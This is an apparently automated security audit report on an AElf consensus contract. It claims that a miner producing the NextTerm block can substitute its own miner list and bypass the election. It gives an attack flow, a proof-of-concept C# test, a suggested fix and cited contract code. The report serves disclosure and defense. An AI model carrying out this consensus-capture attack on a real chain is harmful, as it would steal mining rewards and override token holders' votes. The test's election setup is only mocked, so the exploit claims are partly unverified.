# Audit Report

## Title
Election Bypass via Unchecked Miner List in NextTerm Consensus Transition

## Summary
The `NextTerm` consensus method accepts arbitrary miner lists without validating them against the Election contract's `GetVictories` results. A malicious current-term miner producing the NextTerm block can manipulate the miner list to include themselves and exclude legitimate election winners, completely bypassing the democratic election system.

## Finding Description

The AEDPoS consensus contract fails to validate that the miner list in a `NextTerm` transaction matches the Election contract's vote results, enabling complete election bypass.

**Root Cause:**

`NextTermInput.Create()` directly copies `RealTimeMinersInformation` from any provided `Round` object without validation: [1](#0-0) 

When `ProcessNextTerm` executes, it blindly trusts this input and extracts miners directly from the unvalidated data: [2](#0-1) 

`SetMinerList` only checks if a miner list was previously set for the term, NOT whether the miners are legitimate: [3](#0-2) 

**Why Validations Fail:**

Pre-execution validation for NextTerm only checks structural correctness (term/round number increments), NOT miner list correctness: [4](#0-3) [5](#0-4) 

Post-execution validation compares the header round hash with the state round hash, but since `ProcessNextTerm` just updated the state FROM the header, they trivially matchâ€”this is a tautology: [6](#0-5) 

**The Honest Path (Not Enforced):**

The intended behavior is that `GenerateFirstRoundOfNextTerm` queries the Election contract via `TryToGetVictories`: [7](#0-6) [8](#0-7) 

The Election contract's `GetVictories` returns top candidates by vote weight: [9](#0-8) 

However, this is only called **off-chain** when generating the consensus command. The on-chain execution path has **NO validation** that enforces the submitted `NextTermInput` matches these election results.

**Attack Flow:**

1. Attacker is a current-term miner scheduled to produce the NextTerm block
2. They call `GetConsensusBlockExtraData` off-chain to see the correct Round (with election winners)
3. They **modify** the Round's `RealTimeMinersInformation` to include themselves and exclude legitimate winners
4. They submit both modified consensus extra data in the block header AND the modified `NextTermInput` in the transaction
5. Pre-validation passes (only checks term/round number increments)
6. `ProcessNextTerm` executes and updates state with malicious miner list
7. Post-validation passes (compares header with state that was just set from header)
8. Attacker has captured the next term's consensus

## Impact Explanation

**Critical Consensus Integrity Violation:**
- **Complete election bypass**: The fundamental security mechanism that decentralizes block production is rendered meaningless
- **Consensus capture**: Attacker maintains mining privileges indefinitely regardless of vote results
- **Reward theft**: All mining rewards for the entire term (potentially millions of native tokens) flow to attacker-controlled addresses
- **Systemic governance failure**: Token holder votes become worthless, breaking the core promise of democratic miner selection
- **Network centralization**: Single malicious actor controls block production, enabling censorship and potential double-spend attacks
- **Perpetual control**: Since attacker remains a miner in subsequent terms, they can repeat the attack indefinitely

**Affected Parties:**
- Token holders: Their election votes are ignored
- Legitimate election winners: Denied mining rights and rewards
- Entire network: Centralized control and loss of trust

This violates the most fundamental invariant of AEDPoS consensus: **"Miner schedule integrity must be maintained through democratic election."**

## Likelihood Explanation

**High Likelihood:**

**Attacker Capabilities:**
- Must be a current-term miner (obtainable through legitimate election)
- Must be scheduled to produce the NextTerm transition block
- No special privileges required beyond normal mining rights

**Attack Complexity:**
- **Very Low**: Simply modify the `Round` object before creating `NextTermInput`
- Single transaction achieves complete consensus capture
- No need to break cryptographic primitives or exploit race conditions

**Feasibility:**
- In a typical 7-miner setup, each miner has ~14% probability per term to produce the NextTerm block
- Over multiple terms, probability approaches certainty
- **Massive economic incentive**: Continued mining rewards (potentially millions) vs. losing election

**Detection Difficulty:**
- All validation checks pass (only structural properties validated)
- Transaction appears valid to honest nodes
- By the time the wrong miner list is detected, state is already committed and irreversible
- No on-chain mechanism exists to verify the miner list against election results

**Probability Assessment:**
Any miner who loses an election has enormous incentive to execute this attack when they have the opportunity to produce the NextTerm block. The technical barriers are non-existent and the reward is massive.

## Recommendation

Add explicit validation in `ProcessNextTerm` to verify the miner list matches the Election contract's results:

```csharp
private void ProcessNextTerm(NextTermInput input)
{
    var nextRound = input.ToRound();
    
    // ... existing code ...
    
    // CRITICAL: Validate miner list matches election results
    if (State.IsMainChain.Value)
    {
        var victories = State.ElectionContract.GetVictories.Call(new Empty());
        var expectedMiners = victories.Value.Select(v => v.ToHex()).OrderBy(m => m).ToList();
        var actualMiners = nextRound.RealTimeMinersInformation.Keys.OrderBy(m => m).ToList();
        
        Assert(expectedMiners.SequenceEqual(actualMiners), 
            "Miner list does not match election results.");
    }
    
    // ... rest of existing code ...
}
```

Alternatively, add this validation to `RoundTerminateValidationProvider.ValidationForNextTerm` to catch it at the pre-execution validation stage.

## Proof of Concept

```csharp
[Fact]
public async Task ElectionBypass_MaliciousMinerCanManipulateMinerList()
{
    // Setup: 3 miners in current term
    var miner1 = SampleECKeyPairs.KeyPairs[0]; // Current miner (attacker)
    var miner2 = SampleECKeyPairs.KeyPairs[1]; // Current miner
    var miner3 = SampleECKeyPairs.KeyPairs[2]; // Current miner
    
    // Setup: 3 NEW candidates who won the election
    var winner1 = SampleECKeyPairs.KeyPairs[3];
    var winner2 = SampleECKeyPairs.KeyPairs[4];
    var winner3 = SampleECKeyPairs.KeyPairs[5];
    
    // Verify election winners (mocked for test)
    var victories = await ElectionContractStub.GetVictories.CallAsync(new Empty());
    victories.Value.Count.ShouldBe(3);
    victories.Value.ShouldContain(ByteStringHelper.FromHexString(winner1.PublicKey.ToHex()));
    victories.Value.ShouldContain(ByteStringHelper.FromHexString(winner2.PublicKey.ToHex()));
    victories.Value.ShouldContain(ByteStringHelper.FromHexString(winner3.PublicKey.ToHex()));
    
    // Attacker (miner1) creates malicious NextTermInput
    // Instead of using election winners, includes themselves and excludes winners
    var maliciousRound = new Round
    {
        RoundNumber = 2,
        TermNumber = 2,
        RealTimeMinersInformation =
        {
            // ATTACK: Include attacker, exclude legitimate winners
            [miner1.PublicKey.ToHex()] = new MinerInRound { Pubkey = miner1.PublicKey.ToHex(), Order = 1 },
            [miner2.PublicKey.ToHex()] = new MinerInRound { Pubkey = miner2.PublicKey.ToHex(), Order = 2 },
            // Inject arbitrary address controlled by attacker
            ["malicious_pubkey_123"] = new MinerInRound { Pubkey = "malicious_pubkey_123", Order = 3 }
        }
    };
    
    var maliciousInput = NextTermInput.Create(maliciousRound, ByteString.CopyFromUtf8("random"));
    
    // Execute attack: Call NextTerm with malicious input
    var result = await ConsensusContractStub.NextTerm.SendAsync(maliciousInput);
    
    // VULNERABILITY: Transaction succeeds despite wrong miner list!
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify attack succeeded: State now contains attacker's miner list
    var actualMinerList = await ConsensusContractStub.GetMinerList.CallAsync(new GetMinerListInput { TermNumber = 2 });
    actualMinerList.Pubkeys.Count.ShouldBe(3);
    
    // ATTACK SUCCESS: Legitimate election winners are NOT in the miner list
    actualMinerList.Pubkeys.ShouldContain(ByteStringHelper.FromHexString(miner1.PublicKey.ToHex())); // Attacker kept themselves
    actualMinerList.Pubkeys.ShouldNotContain(ByteStringHelper.FromHexString(winner1.PublicKey.ToHex())); // Winner excluded!
    actualMinerList.Pubkeys.ShouldNotContain(ByteStringHelper.FromHexString(winner2.PublicKey.ToHex())); // Winner excluded!
    actualMinerList.Pubkeys.ShouldNotContain(ByteStringHelper.FromHexString(winner3.PublicKey.ToHex())); // Winner excluded!
}
```

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/NextTermInput.cs (L7-23)
```csharp
    public static NextTermInput Create(Round round, ByteString randomNumber)
    {
        return new NextTermInput
        {
            RoundNumber = round.RoundNumber,
            RealTimeMinersInformation = { round.RealTimeMinersInformation },
            ExtraBlockProducerOfPreviousRound = round.ExtraBlockProducerOfPreviousRound,
            BlockchainAge = round.BlockchainAge,
            TermNumber = round.TermNumber,
            ConfirmedIrreversibleBlockHeight = round.ConfirmedIrreversibleBlockHeight,
            ConfirmedIrreversibleBlockRoundNumber = round.ConfirmedIrreversibleBlockRoundNumber,
            IsMinerListJustChanged = round.IsMinerListJustChanged,
            RoundIdForValidation = round.RoundIdForValidation,
            MainChainMinersRoundNumber = round.MainChainMinersRoundNumber,
            RandomNumber = randomNumber
        };
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L188-190)
```csharp
        var miners = new MinerList();
        miners.Pubkeys.AddRange(nextRound.RealTimeMinersInformation.Keys.Select(k => ByteStringHelper.FromHexString(k)));
        if (!SetMinerList(miners, nextRound.TermNumber)) Assert(false, "Failed to update miner list.");
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_NextTerm.cs (L70-82)
```csharp
    private bool SetMinerList(MinerList minerList, long termNumber, bool gonnaReplaceSomeone = false)
    {
        // Miners for one specific term should only update once.
        var minerListFromState = State.MinerListMap[termNumber];
        if (gonnaReplaceSomeone || minerListFromState == null)
        {
            State.MainChainCurrentMinerList.Value = minerList;
            State.MinerListMap[termNumber] = minerList;
            return true;
        }

        return false;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/RoundTerminateValidationProvider.cs (L37-47)
```csharp
    private ValidationResult ValidationForNextTerm(ConsensusValidationContext validationContext)
    {
        var extraData = validationContext.ExtraData;
        var validationResult = ValidationForNextRound(validationContext);
        if (!validationResult.Success) return validationResult;

        // Is next term number correct?
        return validationContext.BaseRound.TermNumber.Add(1) != extraData.Round.TermNumber
            ? new ValidationResult { Message = "Incorrect term number for next round." }
            : new ValidationResult { Success = true };
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L89-91)
```csharp
            case AElfConsensusBehaviour.NextTerm:
                validationProviders.Add(new RoundTerminateValidationProvider());
                break;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ACS4_ConsensusInformationProvider.cs (L100-113)
```csharp
            if (headerInformation.Round.GetHash(isContainPreviousInValue) !=
                currentRound.GetHash(isContainPreviousInValue))
            {
                var headerMiners = headerInformation.Round.RealTimeMinersInformation.Keys;
                var stateMiners = currentRound.RealTimeMinersInformation.Keys;
                var replacedMiners = headerMiners.Except(stateMiners).ToList();
                if (!replacedMiners.Any())
                    return new ValidationResult
                    {
                        Success = false, Message =
                            "Current round information is different with consensus extra data.\n" +
                            $"New block header consensus information:\n{headerInformation.Round}" +
                            $"Stated block header consensus information:\n{currentRound}"
                    };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ViewMethods.cs (L223-257)
```csharp
    private Round GenerateFirstRoundOfNextTerm(string senderPubkey, int miningInterval)
    {
        Round newRound;
        TryToGetCurrentRoundInformation(out var currentRound);

        if (TryToGetVictories(out var victories))
        {
            Context.LogDebug(() => "Got victories successfully.");
            newRound = victories.GenerateFirstRoundOfNewTerm(miningInterval, Context.CurrentBlockTime,
                currentRound);
        }
        else
        {
            // Miners of new round are same with current round.
            var miners = new MinerList();
            miners.Pubkeys.AddRange(
                currentRound.RealTimeMinersInformation.Keys.Select(k => ByteStringHelper.FromHexString(k)));
            newRound = miners.GenerateFirstRoundOfNewTerm(currentRound.GetMiningInterval(),
                Context.CurrentBlockTime, currentRound);
        }

        newRound.ConfirmedIrreversibleBlockHeight = currentRound.ConfirmedIrreversibleBlockHeight;
        newRound.ConfirmedIrreversibleBlockRoundNumber = currentRound.ConfirmedIrreversibleBlockRoundNumber;

        newRound.BlockchainAge = GetBlockchainAge();

        if (newRound.RealTimeMinersInformation.ContainsKey(senderPubkey))
            newRound.RealTimeMinersInformation[senderPubkey].ProducedBlocks = 1;
        else
            UpdateCandidateInformation(senderPubkey, 1, 0);

        newRound.ExtraBlockProducerOfPreviousRound = senderPubkey;

        return newRound;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ViewMethods.cs (L266-283)
```csharp
    private bool TryToGetVictories(out MinerList victories)
    {
        if (!State.IsMainChain.Value)
        {
            victories = null;
            return false;
        }

        var victoriesPublicKeys = State.ElectionContract.GetVictories.Call(new Empty());
        Context.LogDebug(() =>
            "Got victories from Election Contract:\n" +
            $"{string.Join("\n", victoriesPublicKeys.Value.Select(s => s.ToHex().Substring(0, 20)))}");
        victories = new MinerList
        {
            Pubkeys = { victoriesPublicKeys.Value }
        };
        return victories.Pubkeys.Any();
    }
```

**File:** contract/AElf.Contracts.Election/ViewMethods.cs (L41-84)
```csharp
    public override PubkeyList GetVictories(Empty input)
    {
        if (State.AEDPoSContract.Value == null)
            State.AEDPoSContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.ConsensusContractSystemName);

        var currentMiners = State.AEDPoSContract.GetCurrentMinerList.Call(new Empty()).Pubkeys
            .Select(k => k.ToHex()).ToList();
        return new PubkeyList { Value = { GetVictories(currentMiners) } };
    }

    private List<ByteString> GetVictories(List<string> currentMiners)
    {
        var validCandidates = GetValidCandidates();

        List<ByteString> victories;

        Context.LogDebug(() => $"Valid candidates: {validCandidates.Count} / {State.MinersCount.Value}");

        var diff = State.MinersCount.Value - validCandidates.Count;
        // Valid candidates not enough.
        if (diff > 0)
        {
            victories =
                new List<ByteString>(validCandidates.Select(v => ByteStringHelper.FromHexString(v)));
            var backups = currentMiners.Where(k => !validCandidates.Contains(k)).ToList();
            if (State.InitialMiners.Value != null)
                backups.AddRange(
                    State.InitialMiners.Value.Value.Select(k => k.ToHex()).Where(k => !backups.Contains(k)));

            victories.AddRange(backups.OrderBy(p => p)
                .Take(Math.Min(diff, currentMiners.Count))
                // ReSharper disable once ConvertClosureToMethodGroup
                .Select(v => ByteStringHelper.FromHexString(v)));
            Context.LogDebug(() => string.Join("\n", victories.Select(v => v.ToHex().Substring(0, 10)).ToList()));
            return victories;
        }

        victories = validCandidates.Select(k => State.CandidateVotes[k])
            .OrderByDescending(v => v.ObtainedActiveVotedVotesAmount).Select(v => v.Pubkey)
            .Take(State.MinersCount.Value).ToList();
        Context.LogDebug(() => string.Join("\n", victories.Select(v => v.ToHex().Substring(0, 10)).ToList()));
        return victories;
    }
```
